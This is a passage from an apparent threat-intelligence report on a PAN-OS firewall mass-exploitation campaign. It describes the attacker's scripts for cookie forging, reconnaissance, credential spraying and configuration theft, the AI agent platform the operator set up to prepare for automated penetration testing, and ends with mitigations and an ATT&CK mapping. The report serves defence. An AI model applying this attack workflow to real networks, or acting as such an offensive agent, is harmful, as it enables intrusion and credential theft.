patched.\n\n![Figure 17](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+17.png)\n\n###### Figure 17. Proof-of-concept exploit for CVE-2026-0257 targeting Palo Alto GlobalProtect. Extracts TLS public keys (unauthenticated), forges RSA-encrypted authentication override cookies, and tests gateway/portal endpoints. Uses cryptography library, network sockets, and plaintext TLS handshake parsing for full chain retrieval.\n\nKeycloak SSO and SAML Reconnaissance\n------------------------------------\n\nA cluster of scripts in the open directory targets Keycloak SSO and SAML authentication infrastructure. The reconnaissance script __recon2.sh__ performs Certificate Transparency log enumeration via __crt.sh__ to discover subdomain names associated with the target organization, then resolves them via DNS and probes for Keycloak endpoints:\n\n![Figure 18](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+18.png)\n\n###### Figure 18. CT log and Keycloak SSO reconnaissance from recon2.sh. The script enumerates subdomains via Certificate Transparency, resolves them via DNS, and probes the Keycloak OpenID Connect configuration endpoint to identify authentication infrastructure.\n\nAdditional Keycloak-focused scripts include __kc.sh__, __kc2.sh__, __kc3.sh__ (endpoint enumeration and probing), __kctok.sh__ (token acquisition attempts), __kcv.sh__ (version detection), and __kcout.py__ (output processing). The SAML scripts (__saml1.py__, __saml2.py__, __samldbg.py__, __samlfind.sh__) suggest the operator was also investigating SAML-based single sign-on integration with GlobalProtect.\n\nInternal Network Reconnaissance and Lateral Movement\n----------------------------------------------------\n\nBeyond the initial AD enumeration, the open directory contains a suite of tools specifically designed to map and move through the compromised organization's internal network. These scripts were executed on the rooted PAN-OS appliance itself, using the firewall's privileged position on the network boundary to reach hosts in the internal x.x.x.x/16 range.\n\n### Internal TCP Scanning\n\nThe script __scan.py__ implements a multithreaded TCP port scanner designed to run from the compromised appliance using only Python standard library modules. It targets internal subnets with a curated list of __36 ports__ spanning common enterprise services:\n\n![Figure 19](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+19.png)\n\n###### Figure 19. Internal network scanner from scan.py. The default target subnets (x.x.x.x/24 and x.x.x.x/24) and port list reveal the operator's priorities: Active Directory services (88, 389, 636, 3268), database servers (1433, 1521, 3306, 5432), remote management (3389, 5985/5986), and web applications.\n\nCompanion scripts __scan2.py__ and __scan3.py__ expand this approach to additional subnets. The script dcports.py performs a focused port scan of the domain controller at 10.100.x.x, specifically targeting AD-relevant ports (LDAP, Kerberos, SMB, WinRM, RDP) to confirm service availability before launching more targeted attacks.\n\n### SSH Credential Spraying Against Internal Hosts\n\nThe script __vssh.py__ implements targeted SSH authentication attempts against internal hosts reached through the reverse tunnel. The script uses the Paramiko library to attempt connections with harvested SSH keys and a curated list of usernames and passwords targeting PAN-OS service accounts, VMware infrastructure accounts, and common administrative credentials. Target hosts are accessed through the reverse tunnel ports (x.x.x.x:2201 and x.x.x.x:2202), corresponding to the two internal hosts mapped in __tun.sh__.\n\n### On-Box Reconnaissance\n\nThe script __recon3.py__ performs reconnaissance directly from the compromised firewall, combining SSH banner fingerprinting of internal hosts, SSH key and credential harvesting, and a targeted LDAP bind test against the domain controller using credentials extracted from the PAN-OS configuration. The script probes seven internal IP addresses for SSH service banners and validates LDAP credentials against the domain controller's LDAPS endpoint.\n\n### Configuration Mining\n\nThe operator developed multiple scripts to systematically extract intelligence from PAN-OS configuration files on compromised appliances:\n\n-   __cfggrep.py__ parses the merged running configuration XML to extract GlobalProtect gateway settings, tunnel interface definitions, User-ID agent configurations, internal address objects (including NAS, ESXi, vCenter references), static routes, and IPsec tunnel peers.\n\n-   __gp1.py__ specifically targets GlobalProtect authentication override settings, client authentication profiles, certificate profiles, and portal/gateway entries, mapping the organization's VPN authentication architecture.\n\n-   __exfil.py__ performs a comprehensive extraction of pivot-enabling material from the running configuration: HA SSH private keys (PAN-OS roots high-availability over SSH), device certificates with encrypted passphrases, LDAP bind credentials (decrypted in the configuration), address object inventories, and admin account definitions.\n\n-   __secrets2.py__ and __secrectx.py__ extract additional credential material from the appliance.\n\n-   __keys1.py__ harvests SSH keys stored on the appliance for use in lateral movement.\n\n-   __blobs.py__ processes encrypted configuration blobs.\n\n![Figure 20](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+20.png)\n\n###### Figure 20. Configuration extraction targets from exfil.py. The operator's own comments describe the extraction as enabling the move from \"root on one firewall\" to \"inside the AD segment.\"\n\nThe output file __miner.out.gz__ contains 14,806 lines of structured data extracted from __Panorama__ saved configurations, including LDAP bind credentials, SAML/Keycloak endpoints, internal IP address inventories, managed device serial numbers, device groups, and firewall rules targeting domain controller subnets. Its presence on the VPS confirms that configuration extractions were completed and exfiltrated across multiple compromised hosts.\n\n| Extraction Category | Items Found | Key Intelligence Value |\n| --- | --- | --- |\n| Configuration Files Parsed | 3 files  | merged-running-config (941 KB), candidate-snapshot (19.8 MB), ha-remote-rc (568 KB) |\n| LDAP Server Profiles | 9 profiles | Bind DN/passwords for the target's internal AD domain, server addresses on port 636 (LDAPS) |\n| Authentication Profiles | 7 profiles | Auth methods mapped to user groups and access policies |\n| SAML IdP Entries | 4 entries | Keycloak SSO endpoints for two of the organization's SSO realms |\n| Secret Fields (encrypted) | 3 fields | LDAP bind password, 2 cryptographic keys (AQ==-prefixed PAN-OS encryption) |\n| Secret Fields (plaintext) | 22 fields | Key exchange algorithms, master-key settings, rekey intervals |\n| Certificate/Key Paths | 15 paths | Content certs, trusted root CA list (153 KB), internal certificates (18 KB) |\n| Internal Subnets | 25 unique /24s | 10.0.0/8, 172.16.0/12, 192.168.0/16 ranges across 5 major blocks |\n| Panorama-Managed Devices | 6 devices | Firewall fleet managed by the compromised Panorama instance |\n| GlobalProtect Gateways | 2 gateways | two GlobalProtect gateways (hostnames redacted) |\n\n![Figure 21](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+21.png)\n\n###### Figure 21. Distribution of miner.py output by extraction category. The Infrastructure Inventory section dominates the output at 14,685 lines (99.2%), reflecting the script's exhaustive enumeration of every named object, IP address, application signature, and device fingerprint present in the 19.8 MB candidate-snapshot configuration.\n\nThe operator's own comments in __exfil.py__ note that \"the earlier copy on our controller got overwritten by another target,\" indicating the surviving file represents only the last of several extraction runs.\n\nAI-Assisted Offensive Tooling\n-----------------------------\n\nThe open directory contains extensive evidence that the operator integrated multiple AI systems into the attack infrastructure, not merely as coding assistants but as autonomous agents capable of reading offensive playbooks, downloading security tools, and preparing for AI-driven penetration testing. The session logs, database schemas, and configuration files provide a detailed record of how AI was deployed on this VPS.\n\n### Timeline: AI Deployment on the VPS\n\nThe server's bash history reveals a clear sequence of AI tool installation on October 8, 2026. The operator first attempted to run claude (not yet installed), then installed npm via apt, and used it to install __Claude Code__ (Anthropic's AI coding assistant) globally:\n\n![Figure 22](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+22.png)\n\n###### Figure 22.  Bash history entries showing the sequential installation of Claude Code and the aiscan platform. The operator renamed the directory from ai to aiscan before launching the web interface.\n\nThe configuration file __.claude.json__ records the first launch of Claude Code at __08:48:10 UTC__ on October 8, 2026 (version 2.1.293). Twelve minutes later, at __09:00:47 UTC__, the aiscan platform opened its first AI session using __DeepSeek v4-pro__ as the primary model. The entire AI initialization sequence, from first session to full tool readiness, completed in __under nine minutes (09:00 to 09:09 UTC)__.\n\n### The aiscan Platform: Multi-Agent Architecture\n\nThe aiscan directory contains a full installation of an AI-powered offensive security platform built around a multi-agent architecture. The core binary (__aiscan-full__) provides a web interface that was exposed on port 23522. Its configuration file (__aiscan.yaml__) reveals three AI backend providers and a __FOFA reconnaissance key__:\n\n![Figure 23](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+23.png)\n\n###### Figure 23. The aiscan.yaml configuration (API keys redacted). Three distinct AI providers were configured: DeepSeek v4-pro for primary reasoning, DeepSeek v4-flash for rapid tasks, and Kimi k3 for visual analysis of screenshots and images. The FOFA API key directly connects the AI platform to the same internet-wide reconnaissance pipeline that generated the initial 19,182-target list.\n\nThe platform's session logs reveal a multi-agent architecture designed for autonomous penetration testing. The AI reads structured \"skill\" files that define distinct agent roles:\n\n![Figure 24](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+24.png)\n\n###### Figure 24. The aiscan multi-agent penetration testing architecture as described in the platform's skill files.\n\nThe three agent roles operate as follows. The __pentest-coordinator__ receives a target company or root domain, bootstraps an asset inventory, divides work into shards, and dispatches each shard to a __pentest-worker__. Workers execute autonomously: they scan their assigned shard using the platform's built-in tools, write findings to a central hub, and asynchronously dispatch any high-severity results to the __rce-verify__ subagent. The rce-verify agent performs single-finding RCE verification, restricted to id/whoami proof and read-only operations. An __IOA__ (Inter-Operator Async) message bus enables multi-agent collaboration across the system.\n\n### Built-in Offensive Tool Suite\n\nThe aiscan platform provides a library of pseudo-commands (built-in wrappers around security tools) alongside an arsenal package manager for installing external binaries. The session logs show the AI systematically downloading and initializing __17 external tools__ on October 8, all within a __two-minute window (17:05 to 17:07 UTC+8)__:\n\n\u003Ctable id=\"table\" style=\" border-radius: 12px; overflow: hidden; border: 0.5px solid #E6E8EC; border-spacing: 0; line-height: 1.5; text-align: left; margin-bottom: 24px; margin-top: 12px; font-family: Inter; min-width: unset !important; width: 100%;\">\n    \u003Cthead>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Category\u003C/th>\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Tool\u003C/th>\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Type\u003C/th>\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Function\u003C/th>\n        \u003C/tr>\n    \u003C/thead>\n    \u003Ctbody>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Category\" rowspan=\"4\">Built-in pseudo-commands\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">gogo\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Host and service discovery\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">spray\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Web probing and HTTP fingerprinting\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">zombie\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Weak credential checking\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">neutron\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Template-based POC execution (83 templates)\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Category\" rowspan=\"3\">Built-in recon\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">proton\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Secrets and sensitive data scanning\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">passive\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">OSINT\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">FOFA/Shodan/Censys aggregated recon\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">katana/playwright\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Crawler\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Web crawling and headless browser verification\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Category\" rowspan=\"4\">Infrastructure\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">arsenal\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Utility\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Security tool package manager\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">cyberhub\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Utility\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Fingerprint-to-POC mapping database\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">tmux\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Utility\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Session manager for concurrent operations\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">proxy\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Utility\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Proxy node management for anonymized scanning\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Category\" rowspan=\"5\">Arsenal-installed (17 tools)\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">nuclei v3.11.1\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Template-based vulnerability scanner\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">httpx v1.12.0\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Probe\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">HTTP probing and technology detection\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">subfinder v2.17.0\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Recon\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Passive subdomain enumeration\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">naabu v2.6.1\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Scanner\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">Port scanning\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tool\">+ 13 more\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Type\">Various\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Function\">dnsx, katana, uncover, interactsh-client, shuffledns, alterx, cloudlist, mapcidr, tlsx, asnmap, proxify, urlfinder, notify\u003C/td>\n        \u003C/tr>\n    \u003C/tbody>\n\u003C/table>\n\n### Session Logs: The AI Reading Its Own Playbooks\n\nThe most revealing file is the 4.6 MB session log (__session-20261008-170047.789537789.jsonl__), which contains 15,080 event lines documenting a complete AI conversation with __3 turns and 448 discrete events__. The log shows, step by step, how an AI agent prepared itself for offensive security operations.\n\n__Turn 1__ (09:01 UTC, 66 events): The operator's English-language prompt, \"you read my skill.md and so on,\" instructed the DeepSeek v4-pro model to internalize its offensive playbooks. The AI's reasoning chain (4,002 characters) shows it methodically planning which files to read. It then executed 22 glob and read tool calls, ingesting the full set of skill files: aiscan (ASM/pentest toolkit), pentest-coordinator (orchestration), pentest-worker (autonomous execution), rce-verify (RCE validation), report (OKF-style output), ioa-finding (vulnerability publishing), plus playbooks for every scanner (scan, gogo, spray, zombie, neutron, proton) and utility (arsenal, cyberhub, tmux, proxy, passive, katana, playwright, ioa). The AI's text response confirmed it understood its role hierarchy and verification standards:\n\n__Turn 2__ (09:05 UTC, 264 events): The operator switched to __Chinese__: \"下载所有必要的工具及相关资源。\" (\"Download all necessary tools and related resources.\") The AI's reasoning chain expanded to 15,027 characters as it analyzed all 22 arsenal tools, decided which to install (skipping gogo, spray, and zombie as built-in pseudo-commands, and iom as a C2 implant framework \"not needed for ASM/pentest work\"), and executed 55 bash tool calls to download and install 17 external security binaries. The arsenal manifest records all 17 installations completing between 17:05:34 and 17:07:44 UTC+8, a span of just over two minutes.\n\n__Turn 3__ (09:09 UTC, 117 events): A second __Chinese__ prompt: \"初始化所有工具，并确保它们可用。\" (\"Initialize all tools and ensure they are available.\") The AI produced its longest reasoning chain (29,877 characters), systematically verifying every installed binary, building massdns from source as a dependency for shuffledns, testing all pseudo-commands, verifying that the FOFA-backed passive recon returned live results, confirming uncover/subfinder provider configurations, and running functional smoke tests on every core tool. The AI confirmed __83 built-in neutron templates__ were operational and that nuclei had its full template library available.\n\n![Figure 25](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+25.png)\n\n###### Figure 25. Timeline of AI activity on the VPS. The aiscan platform completed a full initialization cycle in under nine minutes (09:00 to 09:09 UTC): the AI read its offensive playbooks, autonomously downloaded 17 security tools, and verified every component was operational. Claude Code had been launched separately on the box 12 minutes earlier.\n\n### Database Schema: Purpose-Built for AI-Driven Penetration Testing\n\nThe platform's SQLite database (__aiscan-web.db__) contains 11 tables that reveal the system's intended operational workflow. The schema itself documents the platform's full capability:\n\n| Table | Rows | Purpose | Key Columns |\n| --- | --- | --- | --- |\n| chat_sessions | 1 | AI conversation sessions | title, agent_name, status |\n| chat_aop_events | 448 | All AI agent operation events | turn_id, emitter, event_json |\n| aop_request_journal | 4 | API request/response log | method (OpenSession, RunTurn) |\n| scans | 0 | Scan task tracking | target, mode, verify, sniper, deep, status |\n| pentest_assets | 0 | Discovered asset inventory | type, value, source, parent_id |\n| pentest_findings | 0 | Vulnerability findings | severity, source_tool, verified |\n| pentest_rce_results | 0 | RCE verification outcomes | target, vector, proof, privilege, status |\n| sco_nodes | 0 | Security Context Objects | cstx_type, data |\n| sco_observations | 0 | Observation linkage | operation_id, observed_at |\n\nMonitoring and Automated Recovery\n---------------------------------\n\nThe operator maintained automated monitoring to detect when compromised appliances went offline (due to reboots, firmware updates, or network changes) and to re-establish access automatically when they returned. The script __mon.sh__ polls the root relay's health endpoint every 20 seconds for up to 80 minutes:\n\n![Figure 26](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/11-2026/Inside+the+PHP2Shell+Arsenal+A+Complete+Dissection+of+a+PAN-OS+Mass-Exploitation+Open+Directory+-+figure+26.png)\n\n###### Figure 26. Health monitoring loop from mon.sh. The operator polled the preserved health.php endpoint (deliberately left unmodified during exploitation) every 20 seconds to detect appliance availability.\n\nThe companion script __watch_recover.sh__, shown earlier, extends this concept: when the firewall comes back online and confirms root access, it automatically re-deploys the AD reconnaissance tooling without operator intervention. This level of automation indicates a sustained, multi-week campaign rather than an opportunistic one-time exploitation.\n\nMitigation and Defensive Recommendations\n----------------------------------------\n\n-   __Restrict Management Access__: Limit PAN-OS management interfaces to dedicated management networks or authorized administrator IPs. Never expose them directly to the internet.\n\n-   __Apply Security Patches__: Promptly install PAN-OS security updates and hotfixes, prioritizing vulnerabilities exploited in the campaign.\n\n-   __Monitor Persistence Artifacts__: Audit for unauthorized services, SSH keys, PAM changes, modified PHP files, and suspicious files in /usr/local/lib/.panops/ and /dev/shm/.\n\n-   __Detect Outbound Tunnels__: Monitor unusual outbound SSH connections from firewalls, reverse SSH tunnels, and SOCKS5 proxies on port 10700.\n\n-   __Strengthen Network Segmentation__: Restrict firewall access to internal systems, including domain controllers and VPN infrastructure. Rotate stored LDAP credentials and shared SSH keys.\n\n-   __Harden GlobalProtect and SSO__: Patch authentication vulnerabilities, enforce MFA, review SAML trust relationships, and monitor VPN logins for suspicious activity.\n\n-   __Prepare for AI-Driven Threats__: Strengthen continuous attack surface monitoring, accelerate patching, and use threat intelligence to detect emerging AI-assisted attacks.\n\nMITRE ATT&CK Matrix\n-------------------\n\nThe following table maps the techniques observed in this campaign to the MITRE ATT&CK framework for Enterprise.\n\n\u003Ctable id=\"table\" style=\" border-radius: 12px; overflow: hidden; border: 0.5px solid #E6E8EC; border-spacing: 0; line-height: 1.5; text-align: left; margin-bottom: 24px; margin-top: 12px; font-family: Inter; min-width: unset !important; width: 100%;\">\n    \u003Cthead>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Tactic\u003C/th>\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Technique\u003C/th>\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">ID\u003C/th>\n            \u003Cth style=\"padding: 14px 16px; font-weight: bold;\">Evidence from Open Directory\u003C/th>\n        \u003C/tr>\n    \u003C/thead>\n    \u003Ctbody>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"3\">Reconnaissance\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Active Scanning: Vulnerability Scanning\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1595.002\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">FOFA-based scan of 19,182 PAN-OS management portals (paloalto_all.csv).\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Gather Victim Host Information: Client Configurations\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1592.004\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Version fingerprinting via precon.py before exploitation.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Search Open Technical Databases\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1596\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Certificate Transparency log enumeration (recon2.sh), DNS reconnaissance (dns1.py), FOFA API queries via aiscan.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\" rowspan=\"3\">Resource Development\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Acquire Infrastructure: Virtual Private Server\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1583.003\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">VPS at 130.94.67[.]235 (AS154177, LIGHT NODE LIMITED, Tokyo) hosting payloads and receiving tunnels.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Develop Capabilities: Exploits\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1587.001\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Custom PAN-OS exploit chain (panos_rce_poc.py), Fragnesia variant (pfrag.py), cookie forging tool (forge_cookie.py).\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Obtain Capabilities: Tool\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1588.002\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">Aiscan AI offensive platform, iox tunneling utility, ProjectDiscovery suite (nuclei, httpx, subfinder, etc.), Claude Code.\u003C/td>\n        \u003C/tr>\n        \u003Ctr style=\"border-bottom: 1px solid #ddd;\">\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Tactic\">Initial Access\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Technique\">Exploit Public-Facing Application\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"ID\">T1190\u003C/td>\n            \u003Ctd style=\"padding: 14px 16px;border: 0.5px solid #E6E8EC;\" data-header=\"Evidence from Open Directory\">PHP session.upload_progress heap corruption on PAN-OS management interface via 